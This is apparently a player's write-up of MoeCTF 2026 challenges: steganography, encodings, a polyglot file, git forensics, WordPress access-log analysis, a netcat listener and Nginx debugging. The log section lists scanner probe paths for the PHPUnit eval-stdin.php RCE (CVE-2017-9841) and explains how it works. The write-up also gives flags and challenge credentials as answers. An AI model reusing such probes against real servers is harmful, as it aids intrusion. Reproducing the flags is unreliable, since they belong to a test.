9ujm1raGD1o3fAwqBEJUghX/q38c0t9MIzp0H/CSfDNkP0QTgeHMncpW6FobkIZCc1LcdOG93pPkRhOg=="
    }
];

function b64ToBytes(s) {
    const bin = atob(s);
    const arr = new Uint8Array(bin.length);
    for (let i = 0; i < bin.length; i++) arr[i] = bin.charCodeAt(i);
    return arr;
}

function esc(s) {
    return String(s)
        .replaceAll("&", "&amp;")
        .replaceAll("<", "&lt;")
        .replaceAll(">", "&gt;")
        .replaceAll('"', "&quot;")
        .replaceAll("'", "&#39;");
}

async function makeKey(password) {
    const raw = new TextEncoder().encode(password);
    const hash = await crypto.subtle.digest("SHA-256", raw);
    return crypto.subtle.importKey("raw", hash, { name: "AES-GCM" }, false, ["decrypt"]);
}

async function tryDecrypt(record, sid) {
    const key = await makeKey(sid);
    const iv = b64ToBytes(commonIv);
    const data = b64ToBytes(record["数据"]);
    const plain = await crypto.subtle.decrypt({ name: "AES-GCM", iv }, key, data);
    const student = JSON.parse(new TextDecoder().decode(plain));
    if (String(student["学号"]) !== sid) throw new Error("mismatch");
    return student;
}

function showErr(msg) {
    const errDom = document.getElementById("error_tip");
    const resDom = document.getElementById("result_box");
    errDom.innerText = msg;
    errDom.style.display = "block";
    resDom.style.display = "none";
}

function showResult(student) {
    const errDom = document.getElementById("error_tip");
    const resDom = document.getElementById("result_box");
    let showHtml = "";
    Object.entries(student).forEach(([fieldName, val]) => {
        showHtml += `<div>${esc(fieldName)}：${esc(val)}</div>`;
    });
    errDom.style.display = "none";
    resDom.innerHTML = showHtml;
    resDom.style.display = "block";
}

async function searchScore() {
    const sidDom = document.getElementById("input_sid");
    const btnDom = document.getElementById("btn_search");
    const sid = sidDom.value.trim();

    if (!/^\d{8}$/.test(sid)) {
        showErr("请输入 8 位数字学号！");
        return;
    }

    btnDom.disabled = true;
    try {
        for (const record of encryptedStudentData) {
            try {
                const student = await tryDecrypt(record, sid);
                showResult(student);
                return;
            } catch (e) {}
        }
        showErr("学号错误");
    } finally {
        btnDom.disabled = false;
    }
}

document.getElementById("input_sid").addEventListener("keydown", e => {
    if (e.key === "Enter") searchScore();
});
</script>
</body>
</html>
```

先看看源码中的加密函数

```javascript
function b64ToBytes(s) {
    const bin = atob(s);
    const arr = new Uint8Array(bin.length);
    for (let i = 0; i < bin.length; i++) arr[i] = bin.charCodeAt(i);
    return arr;
}
```
这里是把` Base64 `字符串解码成字节数组`Uint8Array`。先用 atob 解码，再逐字节转成数字。

```javascript
async function makeKey(password) {
    const raw = new TextEncoder().encode(password);
    const hash = await crypto.subtle.digest("SHA-256", raw);
    return crypto.subtle.importKey("raw", hash, { name: "AES-GCM" }, false, ["decrypt"]);
}
```
用输入的学号生成 AES 密钥：把字符串编码成字节 → 计算 SHA-256 哈希 → 导入为 AES-GCM 的 decrypt 密钥

```javascript
async function tryDecrypt(record, sid) {
    const key = await makeKey(sid);
    const iv = b64ToBytes(commonIv);
    const data = b64ToBytes(record["数据"]);
    const plain = await crypto.subtle.decrypt({ name: "AES-GCM", iv }, key, data);
    const student = JSON.parse(new TextDecoder().decode(plain));
    if (String(student["学号"]) !== sid) throw new Error("mismatch");
    return student;
}
```
用学号尝试解密某条加密记录：生成密钥 → 解码固定 IV 和密文 → 用 AES-GCM 解密 → 解析 JSON → 校验解密出的「学号」是否等于输入，不等就抛错。解密失败（学号不对）会抛异常。

直接爆破的话要每个学号与92条记录相乘，数据量非常大，算不了

查资料发现json是有固定格式的，即`student = JSON.parse(new TextDecoder().decode(plain));`



---

# Misc入门指北

## 欢迎来到取证与安全杂项，或者说是MISC，领取入门指北，找到flag，开始你的挑战吧

这里观察到pdf有些白色的地方光标会变成工字形，说明有白色的文字

发现
01101101 01101111 01100101 01100011 01110100 01100110 01111011 01010111 00110011 00110001
01100011 00110000 01101101 01100101 01011111 00110111 01101111 01011111 01101101 00110001
00110101 01100011 01111101

转成ascii码有`moectf{W31c0me_7o_m15c}`

---

# ez_BASE

## CloverDayssss 心痒难耐，渴望聊天，于是给 starwalking 写去了小纸条。 但他不想让纸条被其他人截获时，内容被一眼看穿——于是他耍了点小聪明，把信息悄悄「加工」了一下。现在纸条到了你手里，你能读懂 CloverDayssss 到底写了什么吗？

打开txt文件发现字段`=0HN2U0cAJ2XudHMut2XzYHQo9Vdwk1emR3Yl9Wb`
推测是倒着的base64加密，于是进行逆运算得出`moectf{Y0u_h@v3_kn0wn_b@sE64}`

---

# ez_LSB

## 图片
![题目图片]{/posts/images/moectf-2026/cat.png}

图片是普通 RGB PNG（无隐藏 chunk、无附加数据），flag 藏在像素 LSB 里。逐像素按 R、G、B 顺序交错读取每个通道的最低有效位（cat.png 为 1706×1279 RGB），拼成字节后开头就是明文 flag:，后面跟的是 Base64 串 bW9lY3Rme2M0N19rTjBXNV9MU0J9，解码即得 flag。

```python
from PIL import Image
import numpy as np, base64

a = np.array(Image.open('cat.png'))
bits = (a & 1).reshape(-1, 3).flatten()   
data = bytearray()
for i in range(0, len(bits) - 7, 8):
    b = 0
    for j in range(8):
        b = (b << 1) | bits[i + j]
    data.append(b)

msg = bytes(data).split(b'\x00', 1)[0]   
print(msg.decode())                       
print(base64.b64decode(msg[5:]).decode()) 
```
---

# 空白文档

## xing说他把flag塞到word文件里了，不兑，为什么文件里什么都没有啊

打开word发现有白色字体，`你知道异或吗？key：office`

用文本编辑打开发现`AgkDChcDFBEOWhEAMFcVNg4cMABXXQQY`
Base64 解码后用 office 做 XOR 循环异或即得 flag
`moectf{wh3re_1s_my_f14g}`

---

# Polyglot

## one file, seven languages.   find out the pieces, rebuild the hidden message.  flag format is moectf{...}

打开文件发现有以下内容：
```
#! /usr/bin/env ruby 			    
#|	
x=""""     		    	
puts"\160\141\162\164\064\072\040\143\171\163\067\064\137\154\164\147\137\137\147\060\063\012"	
     			  	 
	
     			 	  
	
     		 			
	
     			 	 
	
     	     
	
     				 		
	
     		    
	
     			 	 	
	
     		 	  
	
     			  		
	
     		  		
	
     		 		 	
	
     			    
	
     			 	  
	
     		 			 
	
     		 			 
	
     	 					
	
     	 					
	
     	 	 
	
  

__END__
BEGIN { printf "%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c", 112,97,114,116,51,58,32,101,108,49,95,117,110,49,99,121,115,55,52,95,108,10 }
echo -e "\0160\0141\0162\0164\0062\0072\0040\0157\0060\0137\0041\0147\0061\0146\0145\0154\0061\0137\0165\0156\0061"; { exit 0; }
#!perl
{ print pack("C*", 112,97,114,116,53,58,32,116,103,95,95,103,48,51,102,108,102,108,51,110,125,10); exit; }
__END__
# |#
(display "\x70;\x61;\x72;\x74;\x36;\x3a;\x20;\x66;\x6c;\x66;\x6c;\x33;\x6e;\x7d;\x7b;\x30;\x75;\x34;\x73;\x33;\x0a;")
#|
#define z /* """ # */
exec(chr(112)+chr(114)+chr(105)+chr(110)+chr(116)+chr(40)+chr(39)+chr(112)+chr(97)+chr(114)+chr(116)+chr(49)+chr(58)+chr(32)+chr(109)+chr(112)+chr(116)+chr(110)+chr(110)+chr(95)+chr(95)+chr(111)+chr(48)+chr(95)+chr(33)+chr(103)+chr(49)+chr(102)+chr(39)+chr(41))
# |#
```
结合提示可以知道文件里包含 7 种语言，每一种语言会打印出一段碎片（piece），把这些碎片拼起来就能还原出隐藏的 flag。

结合文件使用不同的解释器：
```
ruby polyglot.txt                    # part4
bash polyglot.txt                    # part2
awk -f polyglot.txt                  # part3
perl -x polyglot.txt                 # part5
python3 polyglot.txt                 # part1
guile polyglot.txt                   # part6   
python3 -m whitespace polyglot.txt   # part7   
```

得到：
| 语言 | 触发位置 | 输出 |
|---|---|---|
| Ruby | 第 1 行 shebang | `part4: cys74_ltg__g03` |
| Bash | 第 47 行 `echo -e "\0160..."`（八进制转义） | `part2: o0_!g1fel1_un1` |
| AWK | 第 46 行 `BEGIN { printf ... }` | `part3: el1_un1cys74_l` |
| Perl | 第 48 行 `#!perl`（用 `perl -x` 触发） | `part5: tg__g03flfl3n}` |
| Scheme | 第 52 行 `(display "\x70;...")`（`;` 是 Scheme 字符串分隔） | `part6: flfl3n}{0u4s3` |
| Python | 第 55 行 `exec(chr(112)+...)` | `part1: mptnn__o0_!g1f` |
| Whitespace | 第 7~43 行纯空白块 | `part7: {0u4s3mptnn__` |

其中：

Perl 正常运行会被第 45 行 `__END__` 截断，需要用 `perl -x` 让它从 `#!perl` 行开始执行，才打印出 part5。
第 3 行 `x=""""` 是 Ruby 的字符串拼接技巧，第 54 行 `#define z /* ...` 只是让 C 预处理不报错的障眼法（同时被 Scheme 注释块 `#|...|#` 吞掉）。

Whitespace 解释器会忽略所有非 `空格/制表符/换行` 的字符。用 pip 的 `whitespace` 包解析整个文件，得到指令序列：

```
Push 112, Putc, Push 97, Putc, Push 114, Putc, Push 116, Putc,
Push 55,  Putc, Push 58,  Putc, Push 32,  Putc, Push 123, Putc,
Push 48,  Putc, Push 117, Putc, Push 52,  Putc, Push 115, Putc,
Push 51,  Putc, Push 109, Putc, Push 112, Putc, Push 116, Putc,
Push 110, Putc, Push 110, Putc, Push 95,  Putc, Push 95,  Putc,
Push 10,  Putc, End
```

解码后输出：`part7: {0u4s3mptnn__`。

把 7 段左对齐：

```
mptnn__o0_!g1f
o0_!g1fel1_un1
el1_un1cys74_l
cys74_ltg__g03
tg__g03flfl3n}
flfl3n}{0u4s3
{0u4s3mptnn__
```

竖着读得到
```
moectf{p0lygl0t_1s_fun!_7_l4ngu4g3s_1n_0n3_f1l3}
```
---

# 你会git吗？

## xing 用 copperkoi 的 git 藏了个 flag，你能找到他吗

直接解压在访达里面发现是空白的，用终端看

```
ls -la flag
```

接着查提交历史
```
git log                          
git log --all --oneline --graph  
git log --author="CopperKoi"     
git log -p                       
git show <commit>                
```
没发现东西

查看暂存区
```
git status                 
git ls-files --stage      
```
发现
```
flag.txt
```
内容是
```
flag is me,use base64 and put in moectf{}:ZzE3XzE1X3NvXzNhU3k=
```
解码得到
```
g17_15_so_3aSy
```

---

# 网站日志取证大师

## 这里有一个使用 WordPress 搭建的博客，附件为该博客 6 个小时内的网站日志。网站使用 CDN，源 IP 被 CDN 添加到 HTTP 头部。博客域名为www.blog.moectf和blog.moectf，源服务器 IP 为10.0.0.1（为避免使用公网 IP 引入的额外风险，本题使用内网 IP 来指代真实的公网 IP）请你对该日志进行分析，回答以下问题：本日志中所有 IP 一共向/wp-json/wp/v2/users/me路由枚举了多少个不同用户名？（使用阿拉伯数字整数，不带前缀零，不算空白请求）通过分析请求特征，185.177.72.68这个 IP 使用什么工具（名称/版本号，请以 User-Agent 原始内容为准）对网站进行扫描？在日志记录的这段时间里一共扫描了多少次？在 08/Jul/2026:00:08:07 +0800 左右，该 IP 在探测哪一个漏洞是否可利用（CVE漏洞编号）？扫描的起止时间为？（hhmmss，若从东8时区的当日23时20分40秒至次日0时8分23秒，则为232040-000823）请将以上不同问题的答案用连字符连接，用moectf{}包裹后作为flag提交。最终flag的格式类似这样： moectf{52-python-requests/2.32.4-3000-CVE-2026-43284-232040-000823}注意这不是真实答案，请不要提交上述内容

日志的格式
每行用 `|` 分隔，共 9 个字段：

```
客户端IP | 用户 | 时间 | 域名 | 请求行 | 状态码 | 字节数 | Referer | "User-Agent" "源IP"
```

1. Q1：向 `/wp-json/wp/v2/users/me` 枚举了多少个不同用户名？

筛出所有请求路径含 `/wp-json/wp/v2/users/me` 的行，看日志第 2 列（HTTP Basic Auth 的认证用户名 `user` 字段）

结果：
- 共 29 条 请求，全部返回 `401`（未认证 = 用户名/口令不对或没给）。
- 第 2 列 `user` 字段分布：
  - `-`：13 条（空白，未携带用户名）
  - 非空白：`asq`×3、`ahu`×1、`林林`×3、`linlinzzo`×1、`xxx`×1、`foobar`×1、`deqaz`×1、`aabbcc`×2、`bbccdd`×1、`ccddff`×1、`ddffee`×1
- 题目说"不算空白请求"，即剔除 `user = -` 的 13 条后，非空白用户名去重 = 11 个：
  
2. Q2：185.177.72.68 用什么工具扫描？（User-Agent 原始内容为准）

筛出 `源IP = 185.177.72.68` 的所有请求，统计 UA。

结果：
- 共 2214 条请求，UA 分布：
  - `curl/8.7.1` → 2200 次
  - `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36` → 14 次
- 主体是 `curl/8.7.1`（占比 99.4%），题目明确要求"以 User-Agent 原始内容为准"。

3. Q3：这段时间一共扫描了多少次？

185.177.72.68 在日志窗口内的全部请求数--2214

4. Q4：00:08:07 左右在探测哪个 CVE？

做法：定位 `185.177.72.68` 在 `08/Jul/2026:00:08:0x` 附近的请求。

关键请求（连续 POST，status 都是拦截位 `468`）：

```
00:08:06  POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
00:08:07  POST /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
00:08:07  POST /yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
00:08:07  POST /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
00:08:08  POST /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
```

这是在批量探测 PHPUnit 的 `eval-stdin.php` 远程代码执行漏洞：

- 漏洞编号：CVE-2017-9841
- 原理：旧版 PHPUnit 自带的 `src/Util/PHP/eval-stdin.php` 会直接把 POST 来的 PHP 代码 `eval()` 执行，攻击者可借此拿到服务器命令执行权限。扫描器换不同框架前缀（`/vendor/`、`/laravel/vendor/`、`/yii/vendor/` …）来覆盖多种部署结构。

5. Q5：扫描起止时间（hhmmss）

- 第一条：`07/Jul/2026:23:52:16 +0800` → 235216
- 最后一条：`08/Jul/2026:00:08:08 +0800` → 000808

脚本：
```python
import re
from collections import Counter

records = []
for ln in open('accesslog_4.log', encoding='utf-8', errors='replace'):
    p = [x.strip() for x in ln.rstrip('\n').split('|')]
    if len(p) < 9: continue
    m = re.match(r'^"(.*)"\s+"(.*)"\s*$', p[8])
    ua, src = (m.group(1), m.group(2)) if m else (p[8], '')
    records.append({'client': p[0], 'user': p[1], 'req': p[4], 'src': src, 'ua': ua, 't': p[2]})

me = [r for r in records if '/wp-json/wp/v2/users/me' in r['req']]
users = set(r['user'] for r in me if r['user'] != '-')
print(len(users))                              # 11

r68 = [r for r in records if r['src'] == '185.177.72.68']
print(Counter(r['ua'] for r in r68))            # curl/8.7.1: 2200, ...
print(len(r68))                                 # 2214

for r in r68:
    if 'phpunit' in r['req']:
        print(r['t'], r['req'])
```

---

# 当 Nginx 不在家

## 没有 Python 的优雅，没有 Node.js 的庞大，甚至连最基本的 Web 服务器 Nginx 都不见踪影。林林叹了口气，下意识地敲下ping bing.com，得到的只有一句冰冷的 Network is unreachable。这里是一座数字孤岛，它被彻底切断了与互联网的联系。

## 正当林林以为自己要永远困死在这片荒原时，网卡的指示灯突然毫无征兆地疯狂闪烁起来。

## 他急忙查看系统底层的网络状态，发现了一个诡异的现象：在漆黑的内网深处，似乎有一位“神秘的访客”，正以极度耐心的节奏，每隔十秒钟，就死死地敲击着这台服务器的 3000 端口。

## “咚、咚、咚。”

## 那是来自黑暗中的呼唤。林林知道，那位访客手里握着离开这里的钥匙（Flag），但他现在手里连一扇可以迎客的“门”都没有。没有现成的 Web 框架，在这样一无所有的简陋毛坯房里，他该怎么接住这位访客抛过来的线索？

## 林林盯着屏幕上跳动的光标，突然想起了最原始、最硬核的底层网络工具。那是刻在每一位运维和极客骨子里的求生本能——当剥离了一切华丽的外衣，回归到最纯粹的套接字（Socket）和数据流时，你只需要最简单的武器，就能让声音在荒原中回荡。

## “既然你一直在敲门……那我就把这扇窗，彻底为你敞开。”

## 林林深吸了一口气，在终端上敲下了那行古老而充满力量的命令。

这道题的话，是用ssh连接服务器，然后监听3000端口得到flag字段拼接后得到完整flag

先ssh@moectf..连上服务器，接着打出命令
```
sudo nc -l -p 3000
```
每隔十秒发一次会得到

```
POST /flag HTTP/1.1
Host: 127.0.0.1:3000
User-Agent: python-requests/2.34.2
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Content-Type: application/json
Content-Length: 17

{"ch": "moectf{"}
```

```
POST /flag HTTP/1.1
Host: 127.0.0.1:3000
User-Agent: python-requests/2.34.2
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Content-Type: application/json
Content-Length: 32

{"ch": "WeB_SeRveR-pR0vid3-Re1"}
```

```
POST /flag HTTP/1.1
Host: 127.0.0.1:3000
User-Agent: python-requests/2.34.2
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Content-Type: application/json
Content-Length: 14

{"ch": "laB1"}
```

```
POST /flag HTTP/1.1
Host: 127.0.0.1:3000
User-Agent: python-requests/2.34.2
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Content-Type: application/json
Content-Length: 35

{"ch": "3-5eRv1ce_F0r_THe_w0rLd0}"}
```

拼起来可以得到
```
moectf{WeB_SeRveR-pR0vid3-Re1laB13-5eRv1ce_F0r_THe_w0rLd0}
```

---

# 运维入门指北_revenge

## 林林跟着入门指北一步步操作，本以为能顺理成章地搭建好属于自己的 Typecho 个人博客。可当启动后，访问页面却总是各种报错。

## “明明教程里的每一步指令我都写得清清楚楚啊？怎么跑起来全是坑呢？”

## 你能帮林林排查一下服务配置和环境问题，修复这个脆弱的博客系统并拿到 Flag 吗？

## 博客网站运维文档：

## SSH：name moeops，passwd foo
## Nginx 日志地址：/srv/blog/logs/access.log & /srv/blog/logs/error.log
## 网站文件地址：/var/www/html/
## Nginx 配置文件地址：/etc/nginx/sites-available/blog
## 数据库配置：
## 数据库名：blog
## 用户名：moectf
## 密码：xdsec
## 表前缀：typecho_
## 数据库地址：127.0.0.1
## 数据库端口：3306
## 服务管理：sudo systemctl start/restart/status 服务名

有`/srv/blog/logs/error.log`报错日志，先连上服务器看看报错日志是怎么回事

直接`cat /srv/blog/logs/error.log`得到
```
2026/09/05 08:07:35 [crit] 305#305: *1 connect() to unix:/run/php/php-fpm.sock failed (2: No such file or directory) while connecting to upstream, client: 127.0.0.1, server: blog.moectf, request: "GET / HTTP/1.1", upstream: "fastcgi://unix:/run/php/php-fpm.sock:", host: "127.0.0.1:8080"
2026/09/05 08:07:40 [crit] 306#306: *3 connect() to unix:/run/php/php-fpm.sock failed (2: No such file or directory) while connecting to upstream, client: 127.0.0.1, server: blog.moectf, request: "GET / HTTP/1.1", upstream: "fastcgi://unix:/run/php/php-fpm.sock:", host: "127.0.0.1:8080"
2026/09/05 08:07:43 [crit] 308#308: *5 connect() to unix:/run/php/php-fpm.sock failed (2: No such file or directory) while connecting to upstream, client: 127.0.0.1, server: blog.moectf, request: "GET / HTTP/1.1", upstream: "fastcgi://unix:/run/php/php-fpm.sock:", host: "blog.moectf"
2026/09/05 08:07:43 [crit] 309#309: *7 connect() to unix:/run/php/php-fpm.sock failed (2: No such file or directory) while connecting to upstream, client: 127.0.0.1, server: blog.moectf, request: "GET /favicon.ico HTTP/1.1", upstream: "fastcgi://unix:/run/php/php-fpm.sock:", host: "blog.moectf", referrer: "http://127.0.0.1:54544/"
2026/09/05 08:07:45 [crit] 307#307: *9 connect() to unix:/run/php/php-fpm.sock failed (2: No such file or directory) while connecting to upstream, client: 127.0.0.1, server: blog.moectf, request: "GET / HTTP/1.1", upstream: "fastcgi://unix:/run/php/php-fpm.sock:", host: "127.0.0.1:8080"
2026/09/05 08:07:50 [crit] 310#310: *11 connect() to unix:/run/php/php-fpm.sock failed (2: No such file or directory) while connecting to upstream, client: 127.0.0.1, server: blog.moectf, request: "GET / HTTP/1.1", upstream: "fastcgi://unix:/run/php/php-fpm.sock:", host: "127.0.0.1:8080"
2026/09/05 08:07:55 [crit] 311#311: *13 connect() to unix:/run/php/php-fpm.sock failed (2: No such file or directory) while connecting to upstream, client: 127.0.0.1, server: blog.moectf, request: "GET / HTTP/1.1", upstream: "fastcgi://unix:/run/php/php-fpm.sock:", host: "127.0.0.1:8080"
2026/09/05 08:08:00 [crit] 314#314: *15 connect() to unix:/run/php/php-fpm.sock failed (2: No such file or directory) while connecting to upstream, client: 127.0.0.1, server: blog.moectf, request: "GET / HTTP/1.1", upstream: "fastcgi://unix:/run/php/php-fpm.sock:", host: "127.0.0.1:8080"
2026/09/05 08:08:05 [crit] 315#315: *17 connect() to unix:/run/php/php-fpm.sock failed (2: No such file or directory) while connecting to upstream, client: 127.0.0.1, server: blog.moectf, request: "GET / HTTP/1.1", upstream: "fastcgi://unix:/run/php/php-fpm.sock:", host: "127.0.0.1:8080"
2026/09/05 08:08:10 [crit] 312#312: *19 connect() to unix:/run/php/php-fpm.sock failed (2: No such file or directory) while connecting to upstream, client: 127.0.0.1, server: blog.moectf, request: "GET / HTTP/1.1", upstream: "fastcgi://unix:/run/php/php-fpm.sock:", host: "127.0.0.1:8080"
2026/09/05 08:08:15 [crit] 316#316: *21 connect() to unix:/run/php/php-fpm.sock failed (2: No such file or directory) while connecting to upstream, client: 127.0.0.1, server: blog.moectf, request: "GET / HTTP/1.1", upstream: "fastcgi://unix:/run/php/php-fpm.sock:", host: "127.0.0.1:8080"
2026/09/05 08:08:20 [crit] 317#317: *23 connect() to unix:/run/php/php-fpm.sock failed (2: No such file or directory) while connecting to upstream, client: 127.0.0.1, server: blog.moectf, request: "GET / HTTP/1.1", upstream: "fastcgi://unix:/run/php/php-fpm.sock:", host: "127.0.0.1:8080"
2026/09/05 08:08:25 [crit] 319#319: *25 connect() to unix:/run/php/php-fpm.sock failed (2: No such file or directory) while connecting to upstream, client: 127.0.0.1, server: blog.moectf, request: "GET / HTTP/1.1", upstream: "fastcgi://unix:/run/php/php-fpm.sock:", host: "127.0.0.1:8080"
2026/09/05 08:08:30 [crit] 318#318: *27 connect() to unix:/run/php/php-fpm.sock failed (2: No such file or directory) while connecting to upstream, client: 127.0.0.1, server: blog.moectf, request: "GET / HTTP/1.1", upstream: "fastcgi://unix:/run/php/php-fpm.sock:", host: "127.0.0.1:8080"
2026/09/05 08:08:35 [crit] 321#321: *29 connect() to unix:/run/php/php-fpm.sock failed (2: No such file or directory) while connecting to upstream, client: 127.0.0.1, server: blog.moectf, request: "GET / HTTP/1.1", upstream: "fastcgi://unix:/run/php/php-fpm.sock:", host: "127.0.0.1:8080"
2026/09/05 08:08:40 [crit] 320#320: *31 connect() to unix:/run/php/php-fpm.sock failed (2: No such file or directory) while connecting to upstream, client: 127.0.0.1, server: blog.moectf, request: "GET / HTTP/1.1", upstream: "fastcgi://unix:/run/php/php-fpm.sock:", host: "127.0.0.1:8080"
2026/09/05 08:08:45 [crit] 305#305: *33 connect() to unix:/run/php/php-fpm.sock failed (2: No such file or directory) while connecting to upstream, client: 127.0.0.1, server: blog.moectf, request: "GET / HTTP/1.1", upstream: "fastcgi://unix:/run/php/php-fpm.sock:", host: "127.0.0.1:8080"
2026/09/05 08:08:50 [crit] 305#305: *35 connect() to unix:/run/php/php-fpm.sock failed (2: No such file or directory) while connecting to upstream, client: 127.0.0.1, server: blog.moectf, request: "GET / HTTP/1.1", upstream: "fastcgi://unix:/run/php/php-fpm.sock:", host: "127.0.0.1:8080"
2026/09/05 08:08:55 [crit] 305#305: *37 connect() to unix:/run/php/php-fpm.sock failed (2: No such file or directory) while connecting to upstream, client: 127.0.0.1, server: blog.moectf, request: "GET / HTTP/1.1", upstream: "fastcgi://unix:/run/php/php-fpm.sock:", host: "127.0.0.1:8080"
2026/09/05 08:09:00 [crit] 305#305: *39 connect() to unix:/run/php/php-fpm.sock failed (2: No such file or directory) while connecting to upstream, client: 127.0.0.1, server: blog.moectf, request: "GET / HTTP/1.1", upstream: "fastcgi://unix:/run/php/php-fpm.sock:", host: "127.0.0.1:8080"
2026/09/05 08:09:05 [crit] 305#305: *41 connect() to unix:/run/php/php-fpm.sock failed (2: No such file or directory) while connecting to upstream, client: 127.0.0.1, server: blog.moectf, request: "GET / HTTP/1.1", upstream: "fastcgi://unix:/run/php/php-fpm.sock:", host: "127.0.0.1:8080"
2026/09/05 08:09:10 [crit] 305#305: *43 connect() to unix:/run/php/php-fpm.sock failed (2: No such file or directory) while connecting to upstream, client: 127.0.0.1, server: blog.moectf, request: "GET / HTTP/1.1", upstream: "fastcgi://unix:/run/php/php-fpm.sock:", host: "127.0.0.1:8080"
2026/09/05 08:09:15 [crit] 305#305: *45 connect() to unix:/run/php/php-fpm.sock failed (2: No such file or directory) while connecting to upstream, client: 127.0.0.1, server: blog.moectf, request: "GET / HTTP/1.1", upstream: "fastcgi://unix:/run/php/php-fpm.sock:", host: "127.0.0.1:8080"
2026/09/05 08:09:20 [crit] 305#305: *47 connect() to unix:/run/php/php-fpm.sock failed (2: No such file or directory) while connecting to upstream, client: 127.0.0.1, server: blog.moectf, request: "GET / HTTP/1.1", upstream: "fastcgi://unix:/run/php/php-fpm.sock:", host: "127.0.0.1:8080"
2026/09/05 08:09:25 [crit] 305#305: *49 connect() to unix:/run/php/php-fpm.sock failed (2: No such file or directory) while connecting to upstream, client: 127.0.0.1, server: blog.moectf, request: "GET / HTTP/1.1", upstream: "fastcgi://unix:/run/php/php-fpm.sock:", host: "127.0.0.1:8080"
2026/09/05 08:09:30 [crit] 305#305: *51 connect() to unix:/run/php/php-fpm.sock failed (2: No such file or directory) while connecting to upstream, client: 127.0.0.1, server: blog.moectf, request: "GET / HTTP/1.1", upstream: "fastcgi://unix:/run/php/php-fpm.sock:", host: "127.0.0.1:8080"
2026/09/05 08:09:35 [crit] 305#305: *53 connect() to unix:/run/php/php-fpm.sock failed (2: No such file or directory) while connecting to upstream, client: 127.0.0.1, server: blog.moectf, request: "GET / HTTP/1.1", upstream: "fastcgi://unix:/run/php/php-fpm.sock:", host: "127.0.0.1:8080"
2026/09/05 08:09:40 [crit] 305#305: *55 connect() to unix:/run/php/php-fpm.sock failed (2: No such file or directory) while connecting to upstream, client: 127.0.0.1, server: blog.moectf, request: "GET / HTTP/1.1", upstream: "fastcgi://unix:/run/php/php-fpm.sock:", host: "127.0.0.1:8080"
2026/09/05 08:09:45 [crit] 305#305: *57 connect() to unix:/run/php/php-fpm.sock failed (2: No such file or directory) while connecting to upstream, client: 127.0.0.1, server: blog.moectf, request: "GET / HTTP/1.1", upstream: "fastcgi://unix:/run/php/php-fpm.sock:", host: "127.0.0.1:8080"
2026/09/05 08:09:50 [crit] 305#305: *59 connect() to unix:/run/php/php-fpm.sock failed (2: No such file or directory) while connecting to upstream, client: 127.0.0.1, server: blog.moectf, request: "GET / HTTP/1.1", upstream: "fastcgi://unix:/run/php/php-fpm.sock:", host: "127.0.0.1:8080"
2026/09/05 08:09:55 [crit] 305#305: *61 connect() to unix:/run/php/php-fpm.sock failed (2: No such file or directory) while connecting to upstream, client: 127.0.0.1, server: blog.moectf, request: "GET / HTTP/1.1", upstream: "fastcgi://unix:/run/php/php-fpm.sock:", host: "127.0.0.1:8080"
2026/09/05 08:10:00 [crit] 305#305: *63 connect() to unix:/run/php/php-fpm.sock failed (2: No such file or directory) while connecting to upstream, client: 127.0.0.1, server: blog.moectf, request: "GET / HTTP/1.1", upstream: "fastcgi://unix:/run/php/php-fpm.sock:", host: "127.0.0.1:8080"
2026/09/05 08:10:05 [crit] 306#306: *65 connect() to unix:/run/php/php-fpm.sock failed (2: No such file or directory) while connecting to upstream, client: 127.0.0.1, server: blog.moectf, request: "GET / HTTP/1.1", upstream: "fastcgi://unix:/run/php/php-fpm.sock:", host: "127.0.0.1:8080"
2026/09/05 08:10:10 [crit] 306#306: *67 connect() to unix:/run/php/php-fpm.sock failed (2: No such file or directory) while connecting to upstream, client: 127.0.0.1, server: blog.moectf, request: "GET / HTTP/1.1", upstream: "fastcgi://unix:/run/php/php-fpm.sock:", host: "127.0.0.1:8080"
2026/09/05 08:10:15 [crit] 306#306: *69 connect() to unix:/run/php/php-fpm.sock failed (2: No such file or directory) while connecting to upstream, client: 127.0.0.1, server: blog.moectf, request: "GET / HTTP/1.1", upstream: "fastcgi://unix:/run/php/php-fpm.sock:", host: "127.0.0.1:8080"
2026/09/05 08:10:20 [crit] 306#306: *71 connect() to unix:/run/php/php-fpm.sock failed (2: No such file or directory) while connecting to upstream, client: 127.0.0.1, server: blog.moectf, request: "GET / HTTP/1.1", upstream: "fastcgi://unix:/run/php/php-fpm.sock:", host: "127.0.0.1:8080"
2026/09/05 08:10:25 [crit] 306#306: *73 connect() to unix:/run/php/php-fpm.sock failed (2: No such file or directory) while connecting to upstream, client: 127.0.0.1, server: blog.moectf, request: "GET / HTTP/1.1", upstream: "fastcgi://unix:/run/php/php-fpm.sock:", host: "127.0.0.1:8080"
2026/09/05 08:10:30 [crit] 306#306: *75 connect() to unix:/run/php/php-fpm.sock failed (2: No such file or directory) while connecting to upstream, client: 127.0.0.1, server: blog.moectf, request: "GET / HTTP/1.1", upstream: "fastcgi://unix:/run/php/php-fpm.sock:", host: "127.0.0.1:8080"
2026/09/05 08:10:35 [crit] 306#306: *77 connect() to unix:/run/php/php-fpm.sock failed (2: No such file or directory) while connecting to upstream, client: 127.0.0.1, server: blog.moectf, request: "GET / HTTP/1.1", upstream: "fastcgi://unix:/run/php/php-fpm.sock:", host: "127.0.0.1:8080"
2026/09/05 08:10:40 [crit] 306#306: *79 connect() to unix:/run/php/php-fpm.sock failed (2: No such file or directory) while connecting to upstream, client: 127.0.0.1, server: blog.moectf, request: "GET / HTTP/1.1", upstream: "fastcgi://unix:/run/php/php-fpm.sock:", host: "127.0.0.1:8080"
2026/09/05 08:10:45 [crit] 306#306: *81 connect() to unix:/run/php/php-fpm.sock failed (2: No such file or directory) while connecting to upstream, client: 127.0.0.1, server: blog.moectf, request: "GET / HTTP/1.1", upstream: "fastcgi://unix:/run/php/php-fpm.sock:", host: "127.0.0.1:8080"
